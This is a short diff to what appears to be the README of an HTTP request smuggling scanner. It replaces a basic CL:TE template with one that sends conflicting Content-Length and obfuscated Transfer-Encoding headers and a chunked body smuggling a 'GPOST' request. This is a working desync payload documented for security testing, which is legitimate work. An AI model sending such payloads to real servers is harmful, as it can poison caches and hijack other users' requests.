@@ -5,21 +5,26 @@ I took some ideas from this article https://www.synopsys.com/blogs/software-secu
 
 
 
-A basic CL:TE template:
+Example template:
 ```
-Oracle: match GPOST
+Match: GPOST
 Request: |+
   POST {{.Path}} HTTP/1.1
   Host: {{.Host}}
-  Connection: keep-alive
   Content-Type: application/x-www-form-urlencoded
-  Content-Length: 6
+  Content-length: 4
   Transfer-Encoding: chunked
+  Transfer-encoding: cow
   
+  5c
+  GPOST / HTTP/1.1
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 15
+  
+  x=1
   0
   
-  G
-  
+
 ```
 
 Usage:
